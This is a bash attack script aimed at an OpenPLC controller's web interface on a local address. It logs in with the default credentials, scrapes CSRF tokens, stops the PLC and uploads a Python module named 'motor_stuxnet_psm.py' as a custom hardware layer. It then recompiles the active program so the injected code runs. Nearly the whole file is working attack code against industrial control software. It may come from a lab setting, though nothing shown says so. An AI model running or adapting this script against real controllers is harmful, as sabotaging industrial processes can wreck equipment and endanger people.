#!/bin/bash

PLC_HOST="192.168.1.6"
PLC_PORT="8080"
PLC_USERNAME="openplc"
PLC_PASSWORD="openplc"
COOKIE_JAR="/tmp/plc_cookie_$$.txt"
STUXNET_FILE="motor_stuxnet_psm.py"

# Build full URL with http scheme
PLC_URL="http://$PLC_HOST:$PLC_PORT"

# Login and get session cookie
echo "Login..."
rm -f "$COOKIE_JAR"

# First, GET the login page to extract CSRF token
echo "DEBUG: Fetching login page for CSRF token..."
echo "DEBUG: Using cookie jar: $COOKIE_JAR"
LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "$PLC_URL/login")

echo "DEBUG: Cookies saved: $([ -f "$COOKIE_JAR" ] && echo 'YES' || echo 'NO')"
if [ -f "$COOKIE_JAR" ]; then
    echo "DEBUG: Cookie jar size: $(wc -c < "$COOKIE_JAR") bytes"
fi

# Try multiple CSRF token extraction patterns
echo "DEBUG: Trying to extract CSRF token..."

# Pattern 1: Extract from value='TOKEN' format (single quotes)
CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -o "value='[^']*'" | grep csrf_token -B1 -A1 | grep "value='" | cut -d"'" -f2)

# Pattern 2: If not found, try a different approach - grep for csrf_token then extract the preceding value
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep "csrf_token" | grep -o "value='[^']*'" | cut -d"'" -f2)
fi

# Pattern 3: Try extracting any value attribute before csrf_token name
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -o "<input[^>]*csrf_token[^>]*>" | grep -o "value='[^']*'" | cut -d"'" -f2)
fi

if [ -z "$CSRF_TOKEN" ]; then
    echo "ERROR: Could not extract CSRF token from login page"
    echo "Page content (first 30 lines):"
    echo "$LOGIN_PAGE" | head -30
    echo ""
    echo "Searching for 'csrf' in page:"
    echo "$LOGIN_PAGE" | grep -i csrf || echo "No 'csrf' found in page"
    exit 1
fi

CSRF_TOKEN_LOGIN="$CSRF_TOKEN"
echo "DEBUG: Found login CSRF token: $CSRF_TOKEN_LOGIN"

# Check what cookies were saved from the login page fetch
echo "DEBUG: Current cookie jar contents:"
if [ -f "$COOKIE_JAR" ]; then
    cat "$COOKIE_JAR"
else
    echo "WARNING: Cookie jar file not created yet"
fi

# Now POST the login with CSRF token
# Try sending CSRF token as both a form parameter AND as a header
echo "Posting login credentials..."
LOGIN_RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
     -X POST "$PLC_URL/login" \
     -H "X-CSRFToken: $CSRF_TOKEN" \
     -d "username=$PLC_USERNAME&password=$PLC_PASSWORD&csrf_token=$CSRF_TOKEN")

echo "DEBUG: Login response length: ${#LOGIN_RESPONSE}"
echo "DEBUG: First 300 chars of login response:"
echo "${LOGIN_RESPONSE:0:300}"

if echo "$LOGIN_RESPONSE" | grep -q "Bad Request\|missing\|error" -i; then
    echo "ERROR: Login failed"
    echo "Full response:"
    echo "$LOGIN_RESPONSE"
    echo ""
    echo "DEBUG: Cookies after login attempt:"
    if [ -f "$COOKIE_JAR" ]; then
        cat "$COOKIE_JAR"
    else
        echo "Cookie jar file still not created"
    fi
    exit 1
fi

# Check if we got redirected to dashboard (successful login)
if echo "$LOGIN_RESPONSE" | grep -qi "dashboard\|topology"; then
    echo "Login successful"
elif [ -z "$LOGIN_RESPONSE" ]; then
    echo "Login POST returned empty response - may have redirected"
else
    echo "Login response received, continuing..."
fi

# Stop PLC
echo "Stop PLC..."
curl -s -b "$COOKIE_JAR" \
        -X GET "$PLC_URL/stop_plc" > /dev/null

# Get Active File
echo "Retrieve active file..."
ACTIVE_FILE_RESPONSE=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/dashboard")

echo "DEBUG: Dashboard response length: ${#ACTIVE_FILE_RESPONSE}"

# Check if we got a redirect (login failed)
if echo "$ACTIVE_FILE_RESPONSE" | grep -q "Redirecting"; then
    echo "ERROR: Got redirect response - session expired or invalid"
    exit 1
fi

# Try multiple regex patterns to find the file
# Pattern 1: "file_name.st" (quoted)
ACTIVE_FILE_REGEX="\"([^\"]+\.st)\""
if [[ "$ACTIVE_FILE_RESPONSE" =~ $ACTIVE_FILE_REGEX ]]; then
    MATCH_FILE="${BASH_REMATCH[1]}"
    echo "DEBUG: Found file with quoted pattern: $MATCH_FILE"
# Pattern 2: Common filename format (digits or letters with .st)
elif [[ "$ACTIVE_FILE_RESPONSE" =~ ([a-zA-Z0-9_-]+\.st) ]]; then
    MATCH_FILE="${BASH_REMATCH[1]}"
    echo "DEBUG: Found file with alphanumeric pattern: $MATCH_FILE"
else
    echo "ERROR: PATTERN not found"
    echo "DEBUG: Showing first 500 chars of response:"
    echo "${ACTIVE_FILE_RESPONSE:0:500}"
    exit 1
fi

if [ -z "$MATCH_FILE" ]; then
    echo "ERROR: Could not extract active file name"
    exit 1
fi
echo "Using active file: $MATCH_FILE"

# Enable PSM hardware layer
echo "Change HW Layer..."
if [ ! -f "$STUXNET_FILE" ]; then
    echo "ERROR: custom module file not found: $STUXNET_FILE"
    exit 1
fi

# Get CSRF token from the /hardware page, but fall back to login token
HW_PAGE=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/hardware")
CSRF_TOKEN=$(echo "$HW_PAGE" | grep -o "name='csrf_token' value='[^']*'" | head -n1 | cut -d"'" -f4)
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(echo "$HW_PAGE" | grep -o 'name="csrf_token" value="[^"]*"' | head -n1 | cut -d'"' -f4)
fi

if [ -z "$CSRF_TOKEN" ]; then
    echo "WARNING: could not extract CSRF token from hardware page, using login token"
    CSRF_TOKEN="$CSRF_TOKEN_LOGIN"
else
    echo "DEBUG: Found hardware page CSRF token: $CSRF_TOKEN"
fi

echo "DEBUG: Using CSRF token for hardware update: $CSRF_TOKEN"
HW_RESPONSE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
        -X POST "$PLC_URL/hardware" \
        -H "Referer: $PLC_URL/hardware" \
        -F "hardware_layer=psm_linux" \
        -F "csrf_token=$CSRF_TOKEN" \
        -F "custom_layer_code=<$STUXNET_FILE")

echo "DEBUG: hardware layer response: ${HW_RESPONSE:0:500}"
if echo "$HW_RESPONSE" | grep -qi "error\|bad request\|failed\|missing"; then
    echo "ERROR: hardware layer update failed"
    echo "$HW_RESPONSE"
    exit 1
fi

# Recompile
echo "Compile..."
curl -s -b "$COOKIE_JAR" \
     -X GET "$PLC_URL/compile-program?file=$MATCH_FILE" > /dev/null

COMPILE_LOGS=""
COMPILE_REGEX=".*Compilation finished"
TIMEOUT=30
ELAPSED=0

while ! [[ "$COMPILE_LOGS" =~ $COMPILE_REGEX ]]; do
    if [ "$ELAPSED" -ge "$TIMEOUT" ]; then
        echo "WARNING: Compilation timeout after $TIMEOUT seconds"
        break
    fi
    COMPILE_LOGS=$(curl -s -b "$COOKIE_JAR" "$PLC_URL/compilation-logs")
    sleep 1
    ((ELAPSED++))
done

echo "Deployment complete!"